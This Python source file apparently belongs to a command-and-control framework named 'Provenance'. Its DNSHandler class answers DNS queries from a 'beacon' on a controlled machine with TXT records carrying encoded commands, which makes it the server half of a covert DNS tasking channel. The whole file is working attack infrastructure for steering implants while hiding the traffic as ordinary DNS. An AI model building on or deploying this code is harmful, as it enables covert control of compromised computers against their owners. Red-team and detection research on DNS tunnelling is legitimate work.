import dnslib
from backend.handlers.protocolhandler import ProtocolHandler, Commands
from enum import Enum


class Records(Enum):
    """ The types of records the DNSHandler can currently encode """
    TXT = (dnslib.QTYPE.TXT, dnslib.TXT)


class DNSHandler(ProtocolHandler):
    """ This represents a machine being controlled by Provenance"""

    def __init__(self, ip, socket):
        super().__init__(ip, socket)
        self.record_type = Records.TXT
        # TODO: set record type function
        self.latest_request_id = None

    def __repr__(self):
        return "DNS"

    def handle_request(self, raw_request, port, cmd):
        data = raw_request[0].strip()
        try:
            request = dnslib.DNSRecord.parse(data)
            if request.header.id != self.latest_request_id:
                if request.header.get_opcode() == 0:
                    self.latest_request_id = request.header.id
                    self._send_command(request, port, cmd)
        except dnslib.DNSError:
            self.logger.info("Incorrectly formatted DNS Query. Skipping")
    
    def _send_command(self, request, port, command):
        opcode, cmd = command
        # get the type of record this beacon is ready to receive
        rr_type, rr_constructor = self.record_type.value
        # Generate skeleton question for packet
        command_packet = request.reply() 
        # Generate the response to the question
        command_packet.add_answer(
            dnslib.RR(
                rname=request.get_q().get_qname(),
                rtype=rr_type,
                rclass=dnslib.CLASS.IN,
                rdata=rr_constructor(f"<{opcode.value}>:{cmd}"),
                ttl=1337))
        # send command
        self.logger.info(f"Sending '{cmd}' to {self.ip}")
        self.socket.sendto(command_packet.pack(), (self.ip, port))

